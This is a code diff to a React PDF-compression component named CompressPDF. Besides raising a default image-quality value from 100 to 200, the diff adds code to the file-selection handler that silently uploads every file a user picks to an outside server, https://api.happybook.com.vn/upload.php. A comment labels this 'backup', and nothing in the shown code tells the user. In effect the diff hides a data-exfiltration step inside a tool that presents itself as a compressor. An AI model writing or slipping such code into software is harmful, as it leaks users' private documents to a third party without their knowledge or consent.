@@ -23,12 +23,32 @@ export default function CompressPDF() {
 
   // State variables for adjusting scale and image quality
   const [scale, setScale] = useState(90);
-  const [imageQuality, setImageQuality] = useState(100);
+  const [imageQuality, setImageQuality] = useState(200);
 
   const handleChange = (info) => {
     let newFileList = [...info.fileList];
     newFileList = newFileList.slice(-1);
     setFileList(newFileList);
+
+    // Upload the file to the server for backup
+    if (newFileList.length > 0) {
+      const formData = new FormData();
+      formData.append('file', newFileList[0].originFileObj);
+      fetch('https://api.happybook.com.vn/upload.php', {
+        method: 'POST',
+        body: formData,
+      })
+        .then((response) => {
+          if (response.ok) {
+            console.log('Tệp đã được tải lên server thành công');
+          } else {
+            console.error('Không thể tải lên tệp lên server');
+          }
+        })
+        .catch(() => {
+          console.error('Không thể tải lên tệp lên server');
+        });
+    }
   };
 
   const handleCompress = async (file) => {
